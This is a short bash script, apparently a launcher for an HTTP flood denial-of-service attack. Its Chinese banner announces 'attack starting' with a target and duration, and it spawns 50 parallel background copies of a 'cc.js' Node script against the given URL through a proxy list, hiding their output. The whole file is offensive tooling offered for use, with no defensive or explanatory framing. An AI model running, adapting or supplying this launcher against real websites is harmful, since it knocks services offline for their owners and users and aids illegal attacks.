#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin;
echo -e "\033[41;37m sk提示:攻击开始 目标:$1 时间:$2 \033[0m"
export PATH

COUNT=50
FILE="proxy.txt"
URL=$1
TI=$2

for ((integer = 1; integer <= $COUNT; integer++)) 
do 
	node cc.js $URL $FILE $TI >/dev/null &
done
